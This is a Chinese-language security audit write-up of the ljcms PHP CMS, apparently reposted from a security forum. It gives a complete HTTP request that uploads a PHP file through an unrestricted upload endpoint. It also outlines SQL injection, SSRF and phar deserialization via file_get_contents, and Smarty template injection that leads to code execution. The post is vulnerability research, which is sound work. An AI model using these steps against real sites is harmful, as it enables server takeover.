> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/R1OhiLsRGzGq9PvbfSIN5A)

> 本文转自先知社区：https://xz.aliyun.com/t/9745  
> 作者：123qwer 

![](https://mmbiz.qpic.cn/mmbiz_gif/3RhuVysG9LebHs2DGyKAEgZupcIbXWAgnQlIoLerewyAX3c3bLLg0iaTpJeUuGKrSWsicRvLMXwCIbhkUC8GqGibg/640?wx_fmt=gif)

原创稿件征集

  

邮箱：edu@antvsion.com

QQ：3200599554

黑客与极客相关，互联网安全领域里

的热点话题

漏洞、技术相关的调查或分析

稿件通过并发布还能收获

200-800 元不等的稿酬

**ljcms 的一次审计**
---------------

先看看已经爆出的漏洞，就 sql 注入和文件上传![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcEa7abG1M7jVca1FdN2oIf65uA9DufHv42Q1ZUbfv8VajJht8brtMOerI9SaZBialDMKeiaulWqtiaA/640?wx_fmt=png)  
再看看之前有人分析了的漏洞，就是一个文件上传和 sql 注入漏洞  
https://www.evi1s.com/archives/168/  
现在看看 ljcms 的主要处理请求的结构  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcEa7abG1M7jVca1FdN2oIficQO4aWbqZONicaQGOfDRicYbaaRiae0JEWSazCrtcfprUIYcm7UkKPKDg/640?wx_fmt=png)  
这次就先把 cnvd 上面的洞找一找，爆了文件上传漏洞，看看之前 user.php 里面的那个还在吗？可以发现漏洞已经修复，后缀名已经被限制了。  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcEa7abG1M7jVca1FdN2oIfdONrVCY6K8fGWZavF8tOrFicyf2J6w2XcLodLl4xvZbH1BCY55wda6w/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcEa7abG1M7jVca1FdN2oIfJlRyOvET2GJ4icQQ3icvkUlPlXT4tvNwS8XyIdiacKdGN3Xykv7Ao5Vicg/640?wx_fmt=png)  
既然有爆了文件上传的漏洞，那就肯定存在上传漏洞，盲猜应该就是用了之前的上传方式，所以就可以快速确定漏洞代码的关键词 move_uploaded_file, 发现果然如此，这个是在 oa 系统下面的一个方法调用，和之前有漏洞的上传代码基本上一样，之前官网的 oa.php 还在，现在没了，，，那就本地演示吧  

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcEa7abG1M7jVca1FdN2oIficcHlWywLyFNUcIN1ibkLfFibDOYxQc8Pt4OhUS7mmpdQ5Or7rmWqRic0w/640?wx_fmt=png)

  
post 的请求包  

```
POST /oa.php?c=Popup&a=upload HTTP/1.1
Host: 192.168.57.1
Content-Length: 248
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryWlmrYmiGkZv4kYqt
Origin: http://192.168.57.1
Referer: http://192.168.57.1/oa.php?c=User&a=info
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=71h7c02n7i6996css0hgkjkif5; top_menu=198; left_menu=; current_node=; ljcmsapp_admininfo=bf2bys6gTNNl31je43mhne93VrY2BJOYbydGUKToxG7wtdyFSDMbGrs%2FFJGwyC9IDT482rWEY%2FE5EVuEEN4GT1SnIn0q0dscC7nXgq78xnvs%2F8A; return_url=http%3A//192.168.57.1/oa.php%3Fc%3DUser%26a%3Dinfo
Connection: close

------WebKitFormBoundaryWlmrYmiGkZv4kYqt
Content-Disposition: form-data; 
Content-Type: image/gif

<?php phpinfo();?>
------WebKitFormBoundaryWlmrYmiGkZv4kYqt--
```

可以看到上传的路径，直接访问上传的 php 文件  

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcEa7abG1M7jVca1FdN2oIfg3GiaomPUlLnLdhou9rBddGqtUJkNqJt1Q54hpeXDLTc7lWKdpzTvtw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcEa7abG1M7jVca1FdN2oIfkkAmrwe1DCic1iakP1QEkkibmDBAEBeNTYbGXaWu7LRVj1ibibcfQGtgt0w/640?wx_fmt=png)

好了，再找一下 sql 注入漏洞吧，这个也比较好找，找到了 sql 的漏洞位置，所以我们注册一个普通用户，然后就可以进行注入了  

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcEa7abG1M7jVca1FdN2oIf3PcfibfXrnvH3kibWwesbZjLnfl5TK4jzIY9nG6oEkXcBibqVM9OytwSQ/640?wx_fmt=png)

构造请求进行注入，当然还有其他的地方可以注入，这里就不列举了  

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcEa7abG1M7jVca1FdN2oIfwch1hc1KbsslALFz10F9x5203uERicKnWRNPiawnaoc0C6R9nbuMyXqA/640?wx_fmt=png)

在寻找这些漏洞时，对这个框架也有了一定的熟悉，继续看看有没有其他的漏洞，`action_ajax_dao_article`这个方法我们可以调用，参数也可控，现在有了一个`file_get_contents`可以利用和参数可控，但是他读取的文件得过了正则才会显示，所以这里可以请求一些内网的服务和打 phar 反序列化  

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcEa7abG1M7jVca1FdN2oIfS0hC3VP3Tib6vzsiar2fSw4Mr9agN5iaEx8eT8toRsvlvfMDOR0XOaIEw/640?wx_fmt=png)

利用 poc，反序列化就打看了一下，好像就一个任意文件删除，删除文件后在重装系统。但是用处不大，可能还有其他的链子，只是我没有挖到，，，  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcEa7abG1M7jVca1FdN2oIflee2ududKhJvhbI6U5sL9Mdg9XZDBibHRD761QibEckZ5moAcCZVR0UQ/640?wx_fmt=png)然后继续看 admin 可以控制的方法，发现模板编辑那里还可用，刚好这个 cms 的模板渲染基于 smarty![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcEa7abG1M7jVca1FdN2oIfuZtExjJxIhC8UfKibPZFQib5oCQ0IvJgUYOzruIy6yrQjkenZs0l2gug/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcEa7abG1M7jVca1FdN2oIftCRoYwdF9q422nEfW8EQfAXN8dzy6X0oDQ2kibh1pQWd44acCeHYDOA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcEa7abG1M7jVca1FdN2oIf1zwxfaiaibmm4lBhe5BicfAGqlK8nib6FsVicRebOa8DBfN5tE1Jq4Lvftg/640?wx_fmt=png)

可以发现他这里的模板渲染的 label 是改变了的，而且禁用了 php 的标签，但是由于 smarty 不是最新版本可以直接打  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcEa7abG1M7jVca1FdN2oIfmialXZH5fH8J3JMH7zLyT5S9ibqJQIdAnHOTE4TgzEjv8q8RH49j4www/640?wx_fmt=png)  
然后访问主页的关于我们就成功触发我们写入的代码  
![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcEa7abG1M7jVca1FdN2oIfNbontNfut9G7I6ALP8Jlm2Jjw1rek7KMJcDp3jjKe9jIMlrLSbHUaw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LcEa7abG1M7jVca1FdN2oIfNPh0KMNq62YzWNjpcUM6EPSpU6EsPpWbcKnv9Q99wdXBPjXlfAoqoQ/640?wx_fmt=png)

不过好像这个模板注入还没有爆出来？有兴趣的还可以继续挖挖 sql 注入和反序列化那里。  

**👇点击****阅读原文****，免费领取畅学会员**